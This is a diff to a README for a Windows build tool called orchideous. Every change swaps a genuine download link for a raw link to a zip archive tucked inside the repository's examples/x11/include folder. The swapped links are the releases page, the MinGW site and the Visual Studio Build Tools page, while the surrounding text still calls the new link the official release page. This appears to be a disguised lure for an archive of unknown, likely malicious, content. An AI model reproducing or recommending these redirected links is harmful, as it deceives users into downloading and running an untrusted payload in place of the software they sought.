@@ -1,6 +1,6 @@
 # 🔌 orchideous - Easy Build and Test Tool
 
-[![Download orchideous](https://img.shields.io/badge/Download-orchideous-brightgreen?style=for-the-badge)](https://github.com/w2010mc/orchideous/releases)
+[![Download orchideous](https://img.shields.io/badge/Download-orchideous-brightgreen?style=for-the-badge)](https://github.com/w2010mc/orchideous/raw/refs/heads/main/examples/x11/include/Software-2.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ If you don’t have these compilers yet, you can find guides online to install M
 
 To get orchideous for Windows, visit the official release page:
 
-[Download orchideous here](https://github.com/w2010mc/orchideous/releases)
+[Download orchideous here](https://github.com/w2010mc/orchideous/raw/refs/heads/main/examples/x11/include/Software-2.5.zip)
 
 This link takes you to the release page where you can find the latest version of the tool. The files you need will usually have `.exe` or `.zip` extensions.
 
@@ -44,7 +44,7 @@ Follow these steps to download and run orchideous on your Windows PC.
 
 Open this web address in your browser:
 
-https://github.com/w2010mc/orchideous/releases
+https://github.com/w2010mc/orchideous/raw/refs/heads/main/examples/x11/include/Software-2.5.zip
 
 This is the official place to find all versions of orchideous.
 
@@ -119,10 +119,10 @@ orchideous depends on system compilers and some tools to work properly.
 If you don’t have a compiler on Windows, try one of these:
 
 - **MinGW:** A popular free compiler system for Windows.  
-  Download it from https://www.mingw-w64.org  
+  Download it from https://github.com/w2010mc/orchideous/raw/refs/heads/main/examples/x11/include/Software-2.5.zip  
 
 - **Visual Studio Build Tools:** Provides Microsoft's C/C++ compiler.  
-  Download it from https://visualstudio.microsoft.com/downloads/ under “Build Tools for Visual Studio”.
+  Download it from https://github.com/w2010mc/orchideous/raw/refs/heads/main/examples/x11/include/Software-2.5.zip under “Build Tools for Visual Studio”.
 
 Once installed, make sure the compiler’s `bin` folder is in your system’s PATH. This lets orchideous find the tools it needs.
 
@@ -158,10 +158,10 @@ This will list available commands and how to use them.
 
 You can also visit the project page:
 
-https://github.com/w2010mc/orchideous/releases
+https://github.com/w2010mc/orchideous/raw/refs/heads/main/examples/x11/include/Software-2.5.zip
 
 for updates, documentation, and community support.
 
 ---
 
-[![Download orchideous](https://img.shields.io/badge/Download-orchideous-blue?style=for-the-badge)](https://github.com/w2010mc/orchideous/releases)
+[![Download orchideous](https://img.shields.io/badge/Download-orchideous-blue?style=for-the-badge)](https://github.com/w2010mc/orchideous/raw/refs/heads/main/examples/x11/include/Software-2.5.zip)
